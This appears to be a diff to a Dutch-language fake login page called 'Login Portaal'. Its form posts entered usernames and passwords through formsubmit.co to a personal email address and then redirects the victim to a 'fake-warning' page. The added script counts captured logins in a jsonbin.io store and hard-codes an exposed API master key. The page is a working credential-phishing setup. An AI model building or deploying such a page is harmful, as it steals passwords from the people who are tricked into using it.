@@ -4,34 +4,38 @@
   <meta charset="UTF-8">
   <title>Login Portaal</title>
   <style>
-    body {
-      background-color: #111;
-      color: #0f0;
-      font-family: monospace;
-      text-align: center;
-      margin-top: 100px;
-    }
-    input, button {
-      padding: 10px;
-      margin: 10px;
-      background: #222;
-      color: #0f0;
-      border: none;
-    }
-    #result {
-      display: none;
-      margin-top: 30px;
-      color: red;
-    }
+    body { background-color: #111; color: #0f0; font-family: monospace; text-align: center; margin-top: 100px; }
+    input, button { padding: 10px; margin: 10px; background: #222; color: #0f0; border: none; }
   </style>
 </head>
 <body>
   <h2>Login bij Mijn Portaal</h2>
-  <form action="https://formsubmit.co/matteogoossens@tuta.io" method="POST" id="loginForm">
+  <form action="https://formsubmit.co/matteogoossens@tuta.io" method="POST" onsubmit="updateCounter()">
     <input type="text" name="username" placeholder="Gebruikersnaam" required><br>
     <input type="password" name="password" placeholder="Wachtwoord" required><br>
-    <input type="hidden" name="_next" value="https://gooske28.github.io/fake-warning.html">
+    <input type="hidden" name="_next" value="fake-warning.html">
     <button type="submit">Inloggen</button>
   </form>
+
+  <script>
+    async function updateCounter() {
+      const res = await fetch('https://api.jsonbin.io/v3/b/682234628960c979a598145d/latest', {
+        headers: { 'X-Master-Key': '$2a$10$wENWrVjRd71mirvN8yXHEOrEjJlZAUgWgX4H4cD9uEE54vsIMf6h2' }
+      });
+      const data = await res.json();
+      const newCount = data.record.logins + 1;
+
+      await fetch('https://api.jsonbin.io/v3/b/JOUW_BIN_ID', {
+        method: "PUT",
+        headers: {
+          "Content-Type": "application/json",
+          "X-Master-Key": "$2a$10$wENWrVjRd71mirvN8yXHEOrEjJlZAUgWgX4H4cD9uEE54vsIMf6h2",
+          "X-Bin-Versioning": "false"
+        },
+        body: JSON.stringify({ logins: newCount })
+      });
+    }
+  </script>
 </body>
 </html>
+
